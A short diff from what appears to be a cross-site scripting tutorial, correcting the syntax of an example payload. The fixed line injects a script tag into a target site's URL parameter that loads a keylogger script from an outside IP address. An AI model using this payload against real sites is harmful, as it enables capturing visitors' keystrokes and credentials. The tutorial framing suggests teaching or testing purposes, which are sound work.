@@ -30,6 +30,6 @@ After getting your xss alert box, what's next? This is not usually enough to "sh
   ```
   Then call the script in using xss
   ```js
-  http://target.site/welcome.php?user=admin<script src>'http://5.5.5.5/keylogger.js'></script>
+  http://target.site/welcome.php?user=admin<script src='http://5.5.5.5/keylogger.js'></script>
   ```
 
